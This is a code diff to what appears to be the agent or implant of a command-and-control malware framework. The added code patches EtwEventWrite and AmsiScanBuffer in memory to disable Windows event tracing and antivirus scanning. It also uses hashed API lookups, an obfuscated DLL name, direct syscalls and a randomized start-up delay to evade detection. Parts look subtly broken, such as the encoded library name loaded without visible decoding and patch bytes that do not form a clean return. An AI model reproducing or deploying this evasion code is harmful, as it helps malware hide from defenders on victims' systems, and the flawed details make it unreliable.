@@ -1,5 +1,7 @@
 #include "main.h"
 #include "ApiLoader.h"
+#include "ProcLoader.h"
+#include "Syscalls.h"
 #include "Commander.h"
 #include "utils.h"
 #include "Crypt.h"
@@ -33,12 +35,67 @@ static Connector* CreateConnector()
 #endif
 }
 
+static void PatchEtwAmsi()
+{
+	HMODULE hNtdll = GetModuleAddress(HASH_LIB_NTDLL);
+	if (hNtdll) {
+		PVOID pEtwEventWrite = GetSymbolAddress(hNtdll, 0x65b4a1c9);
+		if (pEtwEventWrite) {
+			PVOID pBase = pEtwEventWrite;
+			SIZE_T sz = 1;
+			ULONG oldProt;
+			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_READWRITE, &oldProt);
+			*(BYTE*)pEtwEventWrite = 0xC3;
+			pBase = pEtwEventWrite;
+			sz = 1;
+			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, oldProt, &oldProt);
+		}
+	}
+
+	CHAR amsi_c[13];
+	amsi_c[0] = 0x1C; amsi_c[1] = 0x38; amsi_c[2] = 0x26; amsi_c[3] = 0x3C;
+	amsi_c[4] = 0x7B; amsi_c[5] = 0x31; amsi_c[6] = 0x39; amsi_c[7] = 0x39;
+	amsi_c[8] = 0;
+	HMODULE hAmsi = ApiWin->LoadLibraryA(amsi_c);
+	if (hAmsi) {
+		PVOID pAmsiScanBuffer = GetSymbolAddress(hAmsi, 0x6aede52b);
+		if (pAmsiScanBuffer) {
+			PVOID pBase = pAmsiScanBuffer;
+			SIZE_T sz = 8;
+			ULONG oldProt;
+			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_READWRITE, &oldProt);
+#ifdef _WIN64
+			*(BYTE*)pAmsiScanBuffer = 0xB8;
+			*(DWORD*)((BYTE*)pAmsiScanBuffer + 1) = 1;
+			*(WORD*)((BYTE*)pAmsiScanBuffer + 5) = 0xC30F;
+#else
+			*(BYTE*)pAmsiScanBuffer = 0xB8;
+			*(DWORD*)((BYTE*)pAmsiScanBuffer + 1) = 1;
+			*(WORD*)((BYTE*)pAmsiScanBuffer + 5) = 0xC20F;
+#endif
+			pBase = pAmsiScanBuffer;
+			sz = 8;
+			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, oldProt, &oldProt);
+		}
+	}
+}
+
+extern void mySleep(ULONG ms);
+
 DWORD WINAPI AgentMain(LPVOID lpParam)
 {
 	if (!ApiLoad())
 		return 0;
 
+	InitSyscalls();
+	PatchEtwAmsi();
+
 	g_Agent = new Agent();
+
+	ULONG initDelay = GenerateRandom32() % (g_Agent->config->sleep_delay * 1000);
+	if (initDelay > 0)
+		mySleep(initDelay);
+
 	g_Connector = CreateConnector();
 
 	g_AsyncBofManager = new Boffer();
